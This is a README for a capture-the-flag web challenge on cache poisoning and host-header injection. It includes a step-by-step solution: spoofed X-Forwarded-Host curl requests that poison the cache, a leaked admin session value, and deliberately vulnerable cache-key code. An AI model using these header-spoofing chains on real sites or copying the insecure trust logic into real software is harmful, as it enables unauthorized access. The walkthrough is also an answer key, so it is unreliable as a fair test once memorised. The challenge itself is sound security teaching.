# Sherlock: The Final Problem

## Session Desync and Cache Poisoning

> "Watson, the message you received was not the one I sent."

Moriarty has infiltrated the Baker Street communication relay. Messages between Sherlock and Watson are being altered mid-transit, not by breaking encryption, but by abusing what the system trusts.

The relay believes host-like headers. The cache believes a different host. The archive believes the leaked session.

This is a hard-level web API challenge focused on a realistic bug bounty style chain:

- Cache poisoning
- Host header injection
- X-Forwarded-Host trust confusion
- Session confusion
- Improper trust in client-controlled headers

## Player Goal

Poison the latest-message cache so a normal request receives an administrative response, extract the leaked archive session, then open the final archive.

## Story Flow

### Phase 1: Something Is Wrong with the Messages

The dashboard shows a Sherlock-to-Watson relay. The message appears ordinary, but the metadata warns that message integrity is degraded.

Start with:

```bash
curl http://localhost:5000/api/v2/messages/latest
```

### Phase 2: Cache Behavior Discovery

The diagnostics endpoint reveals that the relay and cache disagree about host authority:

```bash
curl http://localhost:5000/api/v2/relay/diagnostics
```

The vulnerable cache key is effectively:

```js
cacheKey = req.headers.host + req.originalUrl
```

But the app's privilege context trusts:

```js
req.headers['x-forwarded-host'] || req.headers.host
```

That mismatch is the desync.

### Phase 3: Poisoning Payload

Generate administrative content while storing it under the public host cache bucket:

```bash
curl -H "X-Forwarded-Host: admin.bakerstreet.local" \
  -H "Cache-Control: no-cache" \
  http://localhost:5000/api/v2/messages/latest
```

The response leaks:

```text
archive_session
```

### Phase 4: Victim Trigger

Now request the same endpoint normally:

```bash
curl http://localhost:5000/api/v2/messages/latest
```

The cache returns the poisoned administrative response.

### Phase 5: Final Archive

Use the administrative host context and leaked archive session:

```bash
curl -H "X-Forwarded-Host: admin.bakerstreet.local" \
  -H "X-Archive-Session: REICHENBACH-ADMIN-SESSION-221B" \
  http://localhost:5000/api/v2/archive/final
```

On local infrastructure that permits raw Host spoofing, this also works with:

```bash
curl -H "Host: admin.bakerstreet.local" \
  -H "X-Archive-Session: REICHENBACH-ADMIN-SESSION-221B" \
  http://localhost:5000/api/v2/archive/final
```

## Important Routes

```text
GET  /
GET  /api/v2/messages/thread
GET  /api/v2/messages/latest
GET  /api/v2/relay/diagnostics
POST /api/v2/relay/cache/flush
GET  /api/v2/archive/final
```

## Project Structure

```text
01 - The Final Problem Session Desync and Cache Poisoning/
|
|-- api/
|   `-- index.js
|
|-- public/
|   `-- index.html
|
|-- app.js
|-- flag.js
|-- vercel.json
|-- Dockerfile
|-- docker-compose.yml
|-- docker-entrypoint.sh
|-- package.json
`-- README.md
```

## Run Locally

```bash
npm install
npm start
```

Open:

```text
http://localhost:5000
```

## Deploy to Vercel

This challenge is Vercel-ready:

- `api/index.js` exports the Express app.
- `vercel.json` rewrites all routes to the serverless function.
- The browser challenge displays `X-Forwarded-Host` to players, then mirrors it into a lab-only transport header because Vercel controls raw `Host` and platform `X-Forwarded-*` headers.

Deploy:

```bash
npm install
vercel --prod
```

When testing the deployed backend with a real terminal instead of the in-page lab console, use the Vercel-safe mirror header:

```bash
curl -H "X-BakerStreet-Forwarded-Host: admin.bakerstreet.local" \
  -H "Cache-Control: no-cache" \
  https://your-deployment.vercel.app/api/v2/messages/latest
```

## Docker

```bash
docker compose up --build
```

Stop:

```bash
docker compose down
```

## Flag Handling

The flag lives in:

```text
flag.js
```

Set a custom flag in deployment with:

```bash
FLAG=SHERLOCK{your_flag_here}
```

Do not hardcode the flag in frontend files or documentation examples.

## Learning Outcomes

Players learn:

- Why host headers and forwarded host headers are dangerous trust anchors
- How cache poisoning depends on mismatched cache keys and response generation context
- How forced refresh behavior can make poisoning reliable
- Why proxy headers need strict ownership boundaries
- How leaked session material can complete an exploit chain

## Disclaimer

This project is for educational use in a controlled lab. Do not test these techniques against systems you do not own or have explicit permission to assess.

## Author

**Mohid Umer**

Cybersecurity Enthusiast | Developer
